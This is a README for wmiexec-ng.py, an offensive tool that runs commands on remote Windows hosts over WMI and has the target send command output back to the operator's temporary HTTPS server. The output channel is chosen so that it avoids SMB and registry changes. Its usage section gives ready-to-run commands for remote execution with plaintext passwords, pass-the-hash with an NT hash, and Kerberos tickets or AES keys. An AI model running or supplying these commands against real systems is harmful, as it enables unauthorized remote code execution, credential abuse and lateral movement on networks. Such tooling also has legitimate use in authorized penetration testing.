# wmiexec-ng.py

WMI remote command execution with HTTPS-based output retrieval. Like impacket's wmiexec, but the output comes back via an encrypted callback instead of SMB. Thus, output isn't reliant on 445 or modifying the registry (like nxc).

## How it works

1. Connects to target via DCOM/WMI
2. Executes command via `Win32_Process.Create`
3. If `-o` is specified, spins up a temporary HTTPS server and has the target POST the output back

Output retrieval requires the target to reach your machine on a random high port (10000-30000)

## Install

```bash
pipx install wmiexec
```

Requirements: `impacket`

## Usage

```bash
# Basic execution (blind, no output)
python wmiexec-ng.py 192.168.1.10 -u Administrator -p 'password' -x 'whoami'

# With output retrieval
python wmiexec-ng.py 192.168.1.10 -u Administrator -p 'password' -x 'whoami' -o

# Pass-the-hash
python wmiexec-ng.py 192.168.1.10 -u Administrator -H <nthash> -x 'whoami' -o

# Kerberos (with ccache)
export KRB5CCNAME=/tmp/admin.ccache
python wmiexec-ng.py dc01.corp.local -u Administrator -k -d CORP -x 'whoami' -o

# Kerberos (with AES key)
python wmiexec-ng.py dc01.corp.local -u Administrator -aesKey <hex> -d CORP -x 'whoami' -o
```

